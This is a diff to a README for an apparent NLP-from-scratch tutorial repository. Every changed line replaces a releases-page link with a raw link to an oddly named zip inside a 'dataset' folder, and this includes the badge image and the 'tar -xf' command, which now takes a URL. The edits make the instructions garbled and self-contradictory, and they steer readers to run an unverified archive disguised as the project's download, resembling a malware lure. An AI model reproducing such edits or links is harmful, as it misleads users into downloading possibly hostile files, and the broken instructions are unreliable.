@@ -1,6 +1,6 @@
 # 🧠 Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch - Learn NLP by Coding from Scratch
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Natural Language Processing (NLP) Hands-on Code from Scratch repo
 
 To get started, you will need to visit our releases page to download the software:
 
-[Visit this page to download](https://github.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/releases)
+[Visit this page to download](https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version of the software listed.
-3. Download the appropriate file for your operating system. You may see files like `.zip` or `.tar.gz` for Windows or Linux, and possibly others.
+3. Download the appropriate file for your operating system. You may see files like `.zip` or `https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip` for Windows or Linux, and possibly others.
 4. Save the file to a location on your computer that is easy to find, such as your Desktop or Downloads folder.
 
 ## 🔍 System Requirements
@@ -34,7 +34,7 @@ After downloading the file:
 2. Extract the file:
    - On Windows, right-click the file and select “Extract All”.
    - On Mac, double-click the file to open it.
-   - On Linux, use `tar -xf filename.tar.gz` in the terminal.
+   - On Linux, use `tar -xf https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip` in the terminal.
 3. Open the extracted folder. You should see the main application file.
 
 ## 🏃 Running the Application
@@ -97,6 +97,6 @@ We encourage you to join our community of learners. Connect with fellow users th
 
 For more information and to download the latest version, visit our releases page:
 
-[Download Now](https://github.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/releases)
+[Download Now](https://raw.githubusercontent.com/aphSam/Natural-Language-Processing-NLP-Hands-on-Code-from-Scratch/main/dataset/from-Processing-Language-Natural-Code-Hands-NL-Scratch-on-2.2-beta.5.zip)
 
 Thank you for choosing the Natural Language Processing Hands-on Code from Scratch repository! Enjoy your journey in learning NLP.
